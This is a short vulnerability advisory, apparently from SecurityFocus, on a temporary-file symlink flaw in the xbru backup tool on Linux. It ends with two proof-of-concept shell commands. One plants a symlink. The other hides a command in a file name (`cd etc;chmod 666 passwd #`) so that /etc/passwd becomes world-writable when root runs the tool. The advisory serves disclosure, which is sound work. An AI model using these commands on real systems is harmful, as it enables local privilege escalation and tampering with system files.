@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/5708/info
+
+BRU is a backup and restore utility distributed by The Tolis Group. This problem affects the utility on the Linux platform.
+
+xbru does not properly check for the existence of temporary files prior to execution. Because of this, it is possible for a local user to create symbolic links to other files, which will be overwritten by the BRU user. As BRU is typically run by the root user, this could result in the overwriting of root-owned files. 
+
+ln -s /tmp/clobber /tmp/xbru_dscheck.dd
+
+ln -s /etc/log.d/scripts/logfiles/xferlog/'`cd etc;chmod 666 passwd #`' /tmp/xbru_dscheck.dd 
